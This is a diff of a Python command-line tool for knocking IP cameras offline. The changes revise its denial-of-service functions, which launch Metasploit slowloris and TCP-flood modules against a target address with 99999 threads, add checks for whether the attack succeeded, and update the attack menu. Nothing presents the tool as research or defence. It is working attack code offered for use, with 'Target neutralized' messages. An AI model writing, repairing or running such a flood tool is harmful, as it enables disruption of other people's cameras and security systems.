@@ -189,20 +189,25 @@ def discover_devices(network):
 def dos_camera(target_ip):
     print(f"{BLUE}[*] Arming DoS payload for {target_ip}...{RESET}")
     msf_cmd = (
-        f"msfconsole -q -x \"use auxiliary/dos/http/http_flood; "
-        f"set RHOSTS {target_ip}; "
-        f"set TARGETURI /; "
-        f"set THREADS 999999999; "
+        f"msfconsole -q -x \"use auxiliary/dos/http/slowloris; "
+        f"set RHOST {target_ip}; "
+        f"set RPORT 80; "
+        f"set THREADS 99999; "
         f"run; exit\""
     )
     try:
-        print(f"{GREEN}[+] Unleashing HTTP flood - 999999999 threads engaged...{RESET}")
-        subprocess.run(msf_cmd, shell=True, check=True)
-        print(f"{GREEN}[+] Payload delivered to {target_ip}. Target neutralized.{RESET}")
+        print(f"{GREEN}[+] Unleashing Slowloris HTTP flood - 99999 threads engaged...{RESET}")
+        result = subprocess.run(msf_cmd, shell=True, check=True, capture_output=True, text=True)
+        if "Auxiliary module execution completed" in result.stdout:
+            print(f"{GREEN}[+] Payload delivered to {target_ip}. Target neutralized.{RESET}")
+        else:
+            print(f"{RED}[!] Attack completed but may not have succeeded. Check Metasploit output:{RESET}")
+            print(result.stdout)
     except FileNotFoundError:
-        print(f"{RED}[!] Metasploit not installed. Install with: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall{RESET}")
+        print(f"{RED}[!] Metasploit not installed or not in PATH. Install it and try again.{RESET}")
     except subprocess.CalledProcessError as e:
         print(f"{RED}[!] Payload deployment failed: {e}{RESET}")
+        print(f"{RED}Output: {e.output}{RESET}")
     except Exception as e:
         print(f"{RED}[!] Error: {e}{RESET}")
     input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
@@ -449,67 +454,66 @@ def slowloris_attack(target_ip, port="80"):
     print(f"{BLUE}[*] Initiating Slowloris Attack on {target_ip}...{RESET}")
     msf_cmd = (
         f"msfconsole -q -x \"use auxiliary/dos/http/slowloris; "
-        f"set RHOSTS {target_ip}; "
+        f"set RHOST {target_ip}; "
         f"set RPORT {port}; "
-        f"set VERBOSE true; "
+        f"set THREADS 99999; "
         f"run; exit\""
     )
     try:
-        print(f"{GREEN}[+] Launching Slowloris attack on {target_ip}:{port}...{RESET}")
-        subprocess.run(msf_cmd, shell=True, check=True)
-        print(f"{GREEN}[+] Slowloris attack completed.{RESET}")
+        print(f"{GREEN}[+] Launching Slowloris attack on {target_ip}:{port} with 99999 threads...{RESET}")
+        result = subprocess.run(msf_cmd, shell=True, check=True, capture_output=True, text=True)
+        if "Auxiliary module execution completed" in result.stdout:
+            print(f"{GREEN}[+] Slowloris attack completed successfully.{RESET}")
+        else:
+            print(f"{RED}[!] Attack completed but may not have succeeded. Check Metasploit output:{RESET}")
+            print(result.stdout)
     except FileNotFoundError:
         print(f"{RED}[!] Metasploit not installed or not in PATH.{RESET}")
     except subprocess.CalledProcessError as e:
         print(f"{RED}[!] Attack failed: {e}{RESET}")
+        print(f"{RED}Output: {e.output}{RESET}")
     except Exception as e:
         print(f"{RED}[!] Error: {e}{RESET}")
     input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
 
 def http_oversize_attack(target_ip):
     print(f"{BLUE}[*] Initiating HTTP Oversize Headers Attack on {target_ip}...{RESET}")
-    msf_cmd = (
-        f"msfconsole -q -x \"use auxiliary/dos/http/http_oversize; "
-        f"set RHOSTS {target_ip}; "
-        f"run; exit\""
-    )
-    try:
-        print(f"{GREEN}[+] Launching HTTP Oversize Headers attack on {target_ip}...{RESET}")
-        subprocess.run(msf_cmd, shell=True, check=True)
-        print(f"{GREEN}[+] HTTP Oversize attack completed.{RESET}")
-    except FileNotFoundError:
-        print(f"{RED}[!] Metasploit not installed or not in PATH.{RESET}")
-    except subprocess.CalledProcessError as e:
-        print(f"{RED}[!] Attack failed: {e}{RESET}")
-    except Exception as e:
-        print(f"{RED}[!] Error: {e}{RESET}")
+    print(f"{RED}[!] Note: No valid 'http_oversize' module exists in Metasploit.{RESET}")
+    print(f"{CYAN}[!] This feature is unavailable. Use option [1] or [2] instead.{RESET}")
     input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
 
 def rtsp_flood_attack(target_ip):
     print(f"{BLUE}[*] Initiating RTSP Flood Attack on {target_ip}...{RESET}")
     msf_cmd = (
-        f"msfconsole -q -x \"use auxiliary/dos/tcp/rtsp_flood; "
-        f"set RHOSTS {target_ip}; "
+        f"msfconsole -q -x \"use auxiliary/dos/tcp/tcp_flood; "
+        f"set RHOST {target_ip}; "
+        f"set RPORT 554; "
+        f"set THREADS 99999; "
         f"run; exit\""
     )
     try:
-        print(f"{GREEN}[+] Launching RTSP Flood attack on {target_ip}:554...{RESET}")
-        subprocess.run(msf_cmd, shell=True, check=True)
-        print(f"{GREEN}[+] RTSP Flood attack completed.{RESET}")
+        print(f"{GREEN}[+] Launching TCP flood attack on {target_ip}:554 with 99999 threads...{RESET}")
+        result = subprocess.run(msf_cmd, shell=True, check=True, capture_output=True, text=True)
+        if "Auxiliary module execution completed" in result.stdout:
+            print(f"{GREEN}[+] TCP flood attack completed successfully.{RESET}")
+        else:
+            print(f"{RED}[!] Attack completed but may not have succeeded. Check Metasploit output:{RESET}")
+            print(result.stdout)
     except FileNotFoundError:
         print(f"{RED}[!] Metasploit not installed or not in PATH.{RESET}")
     except subprocess.CalledProcessError as e:
         print(f"{RED}[!] Attack failed: {e}{RESET}")
+        print(f"{RED}Output: {e.output}{RESET}")
     except Exception as e:
         print(f"{RED}[!] Error: {e}{RESET}")
     input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
 
 def camera_dos_menu():
     print(f"{BLUE}[*] IP Camera DoS Attack Options{RESET}")
-    print(f"{GREEN}[1] HTTP Flood (Original){RESET}")
-    print(f"{GREEN}[2] Slowloris Attack (Works on most HTTP cameras){RESET}")
-    print(f"{GREEN}[3] HTTP Oversize Headers (For vulnerable cameras){RESET}")
-    print(f"{GREEN}[4] RTSP Flood (For cameras using RTSP on port 554){RESET}")
+    print(f"{GREEN}[1] HTTP Flood (Slowloris on port 80, 99999 threads){RESET}")
+    print(f"{GREEN}[2] Slowloris Attack (Custom port, 99999 threads){RESET}")
+    print(f"{GREEN}[3] HTTP Oversize Headers (Currently unavailable){RESET}")
+    print(f"{GREEN}[4] RTSP Flood (TCP flood on port 554, 99999 threads){RESET}")
     print(f"{RED}[5] Return to Main Menu{RESET}")
     
     choice = input(f"\n{CYAN}[>] Select Camera DoS attack [1-5]: {RESET}")
